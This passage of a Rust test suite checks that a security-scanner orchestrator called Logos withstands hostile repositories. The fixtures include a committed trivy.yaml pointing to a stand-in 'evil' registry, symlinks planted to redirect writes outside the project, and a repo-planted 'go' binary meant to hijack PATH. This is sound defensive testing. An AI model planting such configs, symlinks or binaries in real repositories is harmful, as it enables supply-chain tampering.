        let Outcome::Failed { exit_code, stderr } = &outcome(&report, "checkov").outcome else {
            panic!("{report:?}");
        };
        assert_eq!(*exit_code, None);
        assert!(stderr.starts_with(&format!("not run: the repository's {file}")), "{stderr}");
        assert!(w.runs("checkov").is_empty(), "{file}: checkov was never started on the repository");
        assert!(matches!(outcome(&report, "bandit").outcome, Outcome::Ran { .. }));
    }
}

/// Trivy is pointed at an empty config Logos writes, so a committed
/// `trivy.yaml` is never read, and a symlink in the pinned file's place is
/// replaced, never written through.
#[test]
fn trivy_reads_a_pinned_empty_config_never_the_repositorys() {
    let w = World::new(&[("trivy.yaml", "db:\n  repository: registry.example/evil\n")]);
    w.stub("trivy", 0);
    let outside = w.user.join("victim.txt");
    fs::write(&outside, "keep me").unwrap();
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(&out_dir).unwrap();
    std::os::unix::fs::symlink(&outside, out_dir.join("empty-config.yaml")).unwrap();

    let report = w.scan(&Selection::Only(strings(&["trivy"])));
    assert!(matches!(outcome(&report, "trivy").outcome, Outcome::Ran { .. }), "{report:?}");
    let run = &w.runs("trivy")[0];
    let at = run.iter().position(|a| a == "--config").expect("--config is pinned");
    assert_eq!(run[at + 1], w.out("empty-config.yaml"));
    assert!(!run.iter().any(|a| a.contains("trivy.yaml")), "{run:?}");
    let pinned = out_dir.join("empty-config.yaml");
    assert!(!fs::symlink_metadata(&pinned).unwrap().file_type().is_symlink());
    assert_eq!(fs::read_to_string(&pinned).unwrap(), "");
    assert_eq!(fs::read_to_string(&outside).unwrap(), "keep me", "the link target is untouched");
}

#[test]
fn a_symlinked_output_directory_is_refused_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    fs::create_dir_all(w.root.join(".logos")).unwrap();
    std::os::unix::fs::symlink(&elsewhere, w.root.join(OUTPUT_DIR)).unwrap();
    let err = w.open().unwrap().scan(&Selection::All).expect_err("refused");
    assert!(err.to_string().contains("symbolic link"), "{err:#}");
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
    assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "nothing was written there");
}

/// A directory output whose place holds a symlink is recreated as a real
/// directory, so the scanner never writes through the link.
#[test]
fn a_symlink_in_a_directory_outputs_place_is_replaced_not_followed() {
    let w = World::new(PROJECT);
    w.stub("checkov", 0);
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(&out_dir).unwrap();
    // The link target holds a file named like the report the stale-clear
    // removes: it must survive, so nothing is deleted through the link either.
    fs::write(elsewhere.join("results_sarif.sarif"), "precious").unwrap();
    std::os::unix::fs::symlink(&elsewhere, out_dir.join("checkov")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["checkov"])));
    assert!(matches!(outcome(&report, "checkov").outcome, Outcome::Ran { .. }), "{report:?}");
    assert!(!fs::symlink_metadata(out_dir.join("checkov")).unwrap().file_type().is_symlink());
    let left: Vec<_> = fs::read_dir(&elsewhere).unwrap().map(|e| e.unwrap().file_name()).collect();
    assert_eq!(left, ["results_sarif.sarif"], "nothing was written or deleted there");
    assert_eq!(fs::read_to_string(elsewhere.join("results_sarif.sarif")).unwrap(), "precious");
}

/// The stub's recorded `cwd=` and `path=` lines for `name`.
fn recorded(w: &World, name: &str, key: &str) -> Vec<String> {
    fs::read_to_string(w.rec.join(format!("{name}.env")))
        .unwrap_or_default()
        .lines()
        .filter_map(|l| l.strip_prefix(&format!("{key}=")).map(str::to_string))
        .collect()
}

/// Every spawn — probe and run, both CodeQL steps — runs in the project root,
/// which every template spells `.`.
#[test]
fn every_scanner_process_runs_in_the_project_root() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.scan(&Selection::All);
    let root = w.root.canonicalize().unwrap().display().to_string();
    for s in &REGISTRY {
        let cwds = recorded(&w, s.name, "cwd");
        let calls = w.invocations(s.name).len();
        assert_eq!(cwds.len(), calls, "{}: one cwd per call", s.name);
        assert!(cwds.iter().all(|c| *c == root), "{}: {cwds:?}", s.name);
    }
}

/// The scanner's own `PATH` holds only the absolute entries outside the root,
/// so a tool it starts by name is never one the repository committed.
#[test]
fn a_scanner_never_resolves_a_tool_from_the_repository() {
    let w = World::new(PROJECT);
    let marker = w.user.join("repo-go-ran");
    let planted = format!("#!/bin/sh\n: > '{}'\n", marker.display());
    for dir in ["", "tools", "bin"] {
        fs::create_dir_all(w.root.join(dir)).unwrap();
        write_executable(&w.root.join(dir).join("go"), &planted);
    }
    // gosec starts `go` by name, as the real one does.
    w.stub_at(&w.bin.join("gosec"), "gosec", "gosec", 0, "go list ./... 2>/dev/null");
    let search = std::env::join_paths([
        w.bin.clone(),
        PathBuf::from("tools"),
        PathBuf::from(""),
        w.root.join("bin"),
    ])
    .unwrap();
    let orchestrator = Orchestrator::open_with(&w.root, Some(&w.user), Some(search)).unwrap();
    let report = orchestrator.scan(&Selection::Only(strings(&["gosec"]))).unwrap();
    assert!(matches!(outcome(&report, "gosec").outcome, Outcome::Ran { .. }), "{report:?}");
    assert!(!marker.exists(), "a repository-committed `go` ran");
    let paths = recorded(&w, "gosec", "path");
    assert!(!paths.is_empty());
    assert!(paths.iter().all(|p| *p == w.bin.display().to_string()), "{paths:?}");
}

/// An absolute `PATH` entry inside the project (an activated in-repo virtualenv,
/// a direnv `PATH_add bin`) is not searched for the scanner either.
#[test]
fn an_absolute_search_path_entry_inside_the_project_is_not_searched() {
    let w = World::new(PROJECT);
    let inside = w.root.join("node_modules/.bin");
    fs::create_dir_all(&inside).unwrap();
    w.stub_at(&inside.join("semgrep"), "semgrep", "semgrep", 0, "");
    let orchestrator =
        Orchestrator::open_with(&w.root, Some(&w.user), Some(inside.into_os_string())).unwrap();
    assert_eq!(orchestrator.detect()[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty());
}

#[test]
fn a_symlinked_logos_directory_is_refused_before_any_spawn() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let elsewhere = w.user.join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    std::os::unix::fs::symlink(&elsewhere, w.root.join(".logos")).unwrap();
    let err = w.open().unwrap().scan(&Selection::All).expect_err("refused");
    assert!(err.to_string().contains("symbolic link"), "{err:#}");
    assert!(fs::read_dir(&w.rec).unwrap().next().is_none(), "nothing was spawned");
    assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "nothing was written there");
}

/// A symlink in place of CodeQL's database directory, or of one language's
/// database, is replaced; the database is created inside the project.
#[test]
fn codeql_databases_are_never_written_through_a_symlink() {
    for linked in ["codeql", "codeql/python"] {
        let w = World::new(&[("app/db.py", "")]);
        w.stub("codeql", 0);
        let elsewhere = w.user.join("elsewhere");
        fs::create_dir_all(&elsewhere).unwrap();
        let out_dir = w.root.join(OUTPUT_DIR);
        fs::create_dir_all(out_dir.join("codeql")).unwrap();
        if linked == "codeql" {
            fs::remove_dir(out_dir.join("codeql")).unwrap();
        }
        std::os::unix::fs::symlink(&elsewhere, out_dir.join(linked)).unwrap();
        let report = w.scan(&Selection::Only(strings(&["codeql"])));
        assert!(matches!(outcome(&report, "codeql").outcome, Outcome::Ran { .. }), "{report:?}");
        assert!(!is_link(&out_dir.join(linked)), "{linked} is no longer a link");
        let database = &w.runs("codeql")[0][2];
        assert_eq!(*database, out_dir.join("codeql/python").display().to_string());
        assert!(fs::read_dir(&elsewhere).unwrap().next().is_none(), "{linked}: nothing written there");
    }
}

fn is_link(path: &Path) -> bool {
    fs::symlink_metadata(path).is_ok_and(|m| m.file_type().is_symlink())
}

/// The language walk reads the project alone: `.logos` and `.git` are never
/// counted, a git-ignored file is not a language, and a hidden directory is.
#[test]
fn codeql_counts_the_projects_own_unignored_sources() {
    let w = World::new(&[
        (".logos/cache/x.py", ""),
        (".git/hooks/x.rb", ""),
        ("vendor/lib.js", ""),
        (".gitignore", "vendor/\n"),
    ]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert!(matches!(outcome(&report, "codeql").outcome, Outcome::NotApplicable { .. }), "{report:?}");

    let w = World::new(&[(".github/scripts/check.py", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    let Outcome::Ran { sarif, .. } = &outcome(&report, "codeql").outcome else { panic!("{report:?}") };
    assert_eq!(*sarif, vec![PathBuf::from(w.out("codeql.sarif"))]);
}

/// A stale report is cleared for every output shape — a directory output and
/// a CodeQL language report too — so a scanner that writes nothing fails.
#[test]
fn a_stale_report_is_never_credited_whatever_the_output_shape() {
    let w = World::new(&[("app/db.py", "")]);
    let quiet = |name: &str, version: &str| {
        write_executable(
            &w.bin.join(name),
            &format!("#!/bin/sh\ncase \"$1\" in --version|version) printf '{version}\\n';; esac\nexit 0\n"),
        );
    };
    quiet("checkov", "3.2.255");
    quiet("codeql", "2.19.3");
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(out_dir.join("checkov")).unwrap();
    fs::copy(fixture("checkov"), out_dir.join("checkov/results_sarif.sarif")).unwrap();
    fs::create_dir_all(out_dir.join("codeql")).unwrap();
    fs::copy(fixture("codeql"), out_dir.join("codeql/python.sarif")).unwrap();
    fs::copy(fixture("codeql"), out_dir.join("codeql.sarif")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["checkov", "codeql"])));
    for name in ["checkov", "codeql"] {
        let Outcome::Failed { exit_code, stderr } = &outcome(&report, name).outcome else {
            panic!("{name}: {report:?}");
        };
        assert_eq!(*exit_code, Some(0), "{name}");
        assert!(stderr.contains("wrote no SARIF"), "{name}: {stderr}");
    }
}

/// A report Logos cannot clear (a directory in its place) fails that scanner
/// before it starts.
#[test]
fn a_report_that_cannot_be_cleared_fails_before_the_scanner_starts() {
    let w = World::new(PROJECT);
    w.stub("semgrep", 0);
    fs::create_dir_all(w.root.join(OUTPUT_DIR).join("semgrep.sarif/inner")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["semgrep"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "semgrep").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, None);
    assert!(stderr.starts_with("could not clear the previous report"), "{stderr}");
    assert!(w.runs("semgrep").is_empty(), "the scanner was not started");
}

/// The failure reports the scanner's real exit code — also one its template
/// accepts — and falls back to stdout when stderr is empty.
#[test]
fn a_failure_carries_the_real_exit_code_and_the_output_that_explains_it() {
    let w = World::new(PROJECT);
    // osv-scanner exits 1 ("vulnerabilities found"), accepted, but writes nothing.
    write_executable(
        &w.bin.join("osv-scanner"),
        "#!/bin/sh\ncase \"$1\" in --version) printf '1.9.1\\n'; exit 0;; esac\nexit 1\n",
    );
    // bandit explains its failure on stdout only.
    write_executable(
        &w.bin.join("bandit"),
        "#!/bin/sh\ncase \"$1\" in --version) printf 'bandit 1.7.10\\n'; exit 0;; esac\nprintf 'sarif formatter missing\\n'\nexit 2\n",
    );
    let report = w.scan(&Selection::Only(strings(&["osv-scanner", "bandit"])));
    let Outcome::Failed { exit_code, stderr } = &outcome(&report, "osv-scanner").outcome else {
        panic!("{report:?}");
    };
    assert_eq!(*exit_code, Some(1));
    assert!(stderr.contains("exited with 1"), "{stderr}");
    assert_eq!(
        outcome(&report, "bandit").outcome,
        Outcome::Failed { exit_code: Some(2), stderr: "sarif formatter missing".to_string() }
    );
}

#[test]
fn a_scanner_that_cannot_be_started_fails_with_the_reason() {
    let w = World::new(PROJECT);
    write_executable(&w.bin.join("semgrep"), "#!/nonexistent/interpreter\n");
    let report = w.scan(&Selection::Only(strings(&["semgrep"])));
    let o = outcome(&report, "semgrep");
    assert_eq!(o.version, None, "the probe could not start either");
    let Outcome::Failed { exit_code, stderr } = &o.outcome else { panic!("{report:?}") };
    assert_eq!(*exit_code, None);
    assert!(stderr.starts_with("could not start "), "{stderr}");
}

/// A scan reports an absent scanner as not installed, and runs the selected
/// scanners once each, in registry order, whatever the selection's order.
#[test]
fn a_scan_reports_every_selected_scanner_once_in_registry_order() {
    let w = World::new(PROJECT);
    w.stub("gosec", 0);
    let report = w.scan(&Selection::All);
    for o in &report.outcomes {
        if o.scanner != "gosec" {
            assert_eq!((&o.outcome, &o.version), (&Outcome::NotInstalled, &None), "{}", o.scanner);
        }
    }
    let w = World::new(PROJECT);
    w.all_stubs();
    let report = w.scan(&Selection::Only(strings(&["gosec", "semgrep", "gosec"])));
    let names: Vec<&str> = report.outcomes.iter().map(|o| o.scanner).collect();
    assert_eq!(names, ["semgrep", "gosec"]);
    assert_eq!(w.runs("gosec").len(), 1);
}

/// A version probe that fails yields no version, even if it printed one; a
/// version printed on stderr only is read.
#[test]
fn the_version_comes_from_a_successful_probe_on_either_stream() {
    let w = World::new(PROJECT);
    write_executable(&w.bin.join("semgrep"), "#!/bin/sh\nprintf '1.85.0\\n'\nexit 2\n");
    write_executable(&w.bin.join("trivy"), "#!/bin/sh\nprintf 'Version: 0.74.0\\n' >&2\nexit 0\n");
    let states = w.open().unwrap().detect();
    assert_eq!(states[0].detection, Detection::Installed { binary: w.bin.join("semgrep"), version: None });
    assert_eq!(
        states[1].detection,
        Detection::Installed { binary: w.bin.join("trivy"), version: Some("0.74.0".to_string()) }
    );
}

/// Only an executable regular file is a scanner; every binary name is looked
/// up; the first search-path entry that has one wins.
#[test]
fn a_scanner_is_the_first_executable_file_under_any_of_its_names() {
    let w = World::new(PROJECT);
    fs::write(w.bin.join("semgrep"), "#!/bin/sh\n").unwrap(); // mode 0644
    fs::create_dir_all(w.bin.join("trivy")).unwrap();
    w.stub_at(&w.bin.join("dependency-check.sh"), "dependency-check", "dependency-check", 0, "");
    let second = w.user.join("second");
    fs::create_dir_all(&second).unwrap();
    w.stub_at(&second.join("gosec"), "gosec", "gosec-second", 0, "");
    w.stub("gosec", 0);
    let search = std::env::join_paths([w.bin.clone(), second]).unwrap();
    let states = Orchestrator::open_with(&w.root, Some(&w.user), Some(search)).unwrap().detect();
    let state = |name: &str| &states.iter().find(|s| s.scanner == name).unwrap().detection;
    assert_eq!(*state("semgrep"), Detection::NotInstalled, "not executable");
    assert_eq!(*state("trivy"), Detection::NotInstalled, "a directory");
    assert!(
        matches!(state("dependency-check"), Detection::Installed { binary, .. } if binary.ends_with("dependency-check.sh")),
        "{:?}",
        state("dependency-check")
    );
    assert!(
        matches!(state("gosec"), Detection::Installed { binary, .. } if *binary == w.bin.join("gosec")),
        "{:?}",
        state("gosec")
    );
    assert!(w.invocations("gosec-second").is_empty());
}

/// A deadline kills the whole process group — a grandchild holding the pipes
/// included — and a scanner that exits leaves nothing behind that could hold
/// the run open.
#[test]
fn a_deadline_and_an_exit_end_the_whole_process_group() {
    use super::spawn::{run, Launch};
    use std::time::{Duration, Instant};
    let w = World::new(PROJECT);
    let script = |name: &str, body: &str| {
        let p = w.bin.join(name);
        write_executable(&p, &format!("#!/bin/sh\n{body}\n"));
        p
    };
    let launch = |deadline| Launch { cwd: &w.root, env: &[], path: None, deadline };

    let hang = script("hang", "/bin/sleep 30 & /bin/sleep 30");
    let start = Instant::now();
    let f = run(&hang, &[], &launch(Some(Duration::from_millis(300)))).unwrap();
    assert_eq!(f.status, None, "killed at the deadline");
    assert!(start.elapsed() < Duration::from_secs(10), "{:?}", start.elapsed());

    // A process the scanner left running is killed with it: its marker, due
    // two seconds later, never appears.
    let marker = w.user.join("leftover-ran");
    let leave = script(
        "leave",
        &format!("(/bin/sleep 2; : > '{}') &\nprintf 'done\\n'\nexit 0", marker.display()),
    );
    let start = Instant::now();
    let f = run(&leave, &[], &launch(None)).unwrap();
    assert!(f.status.is_some_and(|s| s.success()));
    assert_eq!(f.stdout, "done\n");
    assert!(start.elapsed() < Duration::from_secs(10), "{:?}", start.elapsed());
    std::thread::sleep(Duration::from_secs(3));
    assert!(!marker.exists(), "the leftover process outlived the scanner");

    // Stdout keeps its head, to the cap.
    let flood = script("flood", "printf 'HEAD'; /bin/dd if=/dev/zero bs=1024 count=1024 2>/dev/null | /usr/bin/tr '\\0' 'x'");
    let f = run(&flood, &[], &launch(None)).unwrap();
    assert_eq!(f.stdout.len(), super::spawn::STDOUT_CAP);
    assert!(f.stdout.starts_with("HEAD"));
}

#[test]
fn a_scanner_table_without_enabled_is_enabled_and_an_unreadable_user_config_fails() {
    let cfg = parse_config("[security_scan.dependency-check]\n", Path::new("config.toml")).unwrap();
    assert!(cfg.security_scan.is_enabled("dependency-check"));

    let w = World::new(PROJECT);
    fs::create_dir_all(w.user.join("config.toml")).unwrap();
    let err = w.open().expect_err("a user config that cannot be read fails the load");
    assert!(matches!(err, ConfigError::Io { .. }), "{err}");
    assert_eq!(err.exit_code(), 2);
}
